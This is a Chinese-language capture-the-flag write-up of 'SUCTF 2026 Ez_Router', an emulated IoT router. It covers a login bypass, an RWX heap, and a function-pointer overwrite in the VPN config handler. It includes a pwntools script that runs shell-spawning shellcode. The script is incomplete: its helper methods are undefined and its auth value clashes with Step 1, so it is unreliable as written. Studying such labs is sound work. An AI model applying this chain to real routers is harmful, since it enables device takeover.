---
title: SUCTF 2026 Ez_Router
contest: SUCTF 2026
year: 2026
difficulty: hard
vuln_type: [auth_bypass, pwn_unknown, web_unknown]
tags: [IoT, router, HTTP-CGI, login-bypass, JSON-XSS, base64-decode, RWX-heap, UAF, function-pointer, shellcode, VPN-config, apply-callback]
attack_chain: ["前端越权: GET /www/http?auth=0&action=login → 拿 session_id=72cb56e041a043ee6dfc3427033ef203", "登录后访问 /control.html 控制台", "二进制架构: http (web) + mainproc (CGI 消息队列) + start.sh", "Init() 用 mprotect 设 heap 为 RWX → 堆上可执行 shellcode", "dispatch_action 处理 6 个 message type: Set_WIFI/Add_MAC/Set_VPN/Edit_VPN_Custom/Apply_VPN", "vpn_config_req 结构体含 apply_cb 函数指针 + custom_ptr", "Set_VPN: malloc 0x100 块，strcpy 8 个字段 (action/name/proto/server/user/pass/cert)", "Edit_VPN_Custom: 改 custom_ptr → 当 0x21 字符时触发 UAF 越界到 apply_cb 字段", "Apply_VPN() 调 apply_cb(req) → 跳到攻击者控制的 shellcode", "payload: shellcode = execve('/bin/sh', ['-c', 'cat flag > ./www/flag.html'])"]
key_payload: "shellcode.ljust(0x7eb, b'\\x90') + b'\\x00'  → Edit_VPN_Custom b'\\x21\\x5c'"
one_liner: IoT 路由器 CGI 消息队列 + UAF 改函数指针 + RWX heap 跑 shellcode
lesson: IoT 路由器架构是 web+daemon 消息队列；RWX heap 是低级 bug；apply_cb 是攻击热点
quality: high
---

# SUCTF 2026 Ez_Router

原文 https://www.ctfiot.com/304030.html （看雪 zer00ne）

## 题目
IoT 路由器仿真环境：
```
├── http              # Web 服务器
├── lib/libutils.so
├── mainproc          # 后台 daemon
├── start.sh
├── tmp/sessions
└── www/
    ├── cgi-bin/      # login.cgi / wifi.cgi / vpn.cgi / list.cgi
    ├── control.html
    ├── index.html
    └── js/dashboard.js
```

## 攻击链
### Step 1: 前端越权登录
```http
GET /www/http?auth=0&action=login HTTP/1.1
```
→ 拿 `session_id=72cb56e041a043ee6dfc3427033ef203`
→ 访问 `/control.html` 控制台

### Step 2: 二进制逆向
- `Init()` constructor:
  ```c
  void Init() {
      void *ptr = malloc(0xf000);
      void *heap_base = (void *)((uintptr_t)ptr & ~0xFFF);
      mprotect(heap_base, 0x21000, PROT_READ | PROT_WRITE | PROT_EXEC);
      free(ptr);
  }
  ```
  → **堆设为 RWX**！

- `mainproc` 消息队列循环：
  ```c
  while (1) {
      CFG_GET(0, &msg, sizeof(msg));
      dispatch_action(&msg);
  }
  ```
- `dispatch_action` switch 6 个 type：
  ```c
  case 0x6374fe30: Set_WIFI(msg); break;
  case 0x74122f00: case 0x74122c02: Add_MAC(msg); break;
  case 0x32ee2000: case 0x32ef2030: Del_MAC(msg); break;
  case 0x9313f7e0: Set_VPN(msg); break;
  case 0xe6133f10: Edit_VPN_Custom(msg); break;
  case 0x96e7ff60: Apply_VPN(); break;
  ```

### Step 3: VPN 配置结构
```c
struct vpn_config_req {
    uint16_t custom_len;
    char _pad[6];
    char cert[8];
    void (*apply_cb)(struct vpn_config_req *);  // 攻击目标
    char action[0x20];
    char name[0x20];
    char proto[0x20];
    char server[0x30];
    char user[0x20];
    char pass[0x20];
    char *custom_ptr;
};
```

### Step 4: Set_VPN → 申请 0x100 块
```c
vpn_list[0] = malloc(sizeof(struct vpn_config_req));
vpn_list[0]->apply_cb = default_vpn_apply;
strcpy(vpn_list[0]->action, input->action);
strcpy(vpn_list[0]->name, input->name);
// ... 8 个 strcpy
```

### Step 5: Edit_VPN_Custom → UAF
- 0x21 字节写入触发越界，覆盖 `apply_cb` 字段
- 因 RWX heap，可写 shellcode

### Step 6: Apply_VPN → 触发 apply_cb
- 跳到 attacker-controlled shellcode
- payload: `execve('/bin/sh', ['/bin/sh', '-c', 'cat flag > ./www/flag.html'])`

## EXP 框架
```python
from pwn import *
import requests, json, base64
context.arch = 'amd64'

class IoTClient:
    def __init__(self, base_url="http://localhost:8080"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()

    def login_bypass(self):
        url = f"{self.base_url}/www/http?action=login&auth=1"
        resp = self.session.get(url, allow_redirects=False)
        return 'session_id' in self.session.cookies

    def set_vpn(self, name, proto="openvpn", server="127.0.0.1", user="admin", password="password", cert="cert.ovpn", custom=""):
        url = f"{self.base_url}/cgi-bin/vpn.cgi"
        return self.session.post(url, json=self._serialize({
            "action": "set", "name": name, "proto": proto,
            "server": server, "user": user, "pass": password,
            "cert": cert, "custom": custom
        })).json()

    def edit_vpn(self, custom_content):
        url = f"{self.base_url}/cgi-bin/vpn.cgi"
        return self.session.post(url, json=self._serialize({
            "action": "edit", "custom": custom_content
        })).json()

    def apply_vpn(self):
        url = f"{self.base_url}/cgi-bin/vpn.cgi"
        return self.session.post(url, json={"action": "apply"}).json()

client = IoTClient()
client.login_bypass()
client.set_wifi(ssid="1", password="2")
for i in range(7):
    client.manage_list(action="add_black", idx=i, mac="123", note="123")

shellcode = asm(shellcraft.execve("/bin/sh", ["/bin/sh", "-c", "cat flag > ./www/flag.html"], 0))
client.set_vpn(name="1", proto="openvpn", server="2", user="3",
              password="4"*0x20, cert=b"\x00\xe9\xf2\x00\x00\x00",
              custom=shellcode.ljust(0x7eb, b"\x90") + b"\x00")

client.edit_vpn(b"\x21\x5c")  # 触发 UAF
client.apply_vpn()  # 触发 apply_cb → shellcode
```

## 教学价值
- **IoT 路由器架构** = web 前端 + 后台 daemon 消息队列
- **RWX heap** 是 Init 错误，导致堆上可执行 shellcode
- **apply_cb 函数指针覆盖** 是 UAF 经典攻击点
- **strcpy 8 字段** + custom_ptr 控制 = 整套利用面
- **Extract JSON 解析** + B64 解码 + hex 解码是常见 web→后端通信格式

## 防御
- 不用 mprotect 设 RWX
- apply_cb 改用 vtable 检查
- 强类型 + 长度字段
- 消息队列做 auth 检查
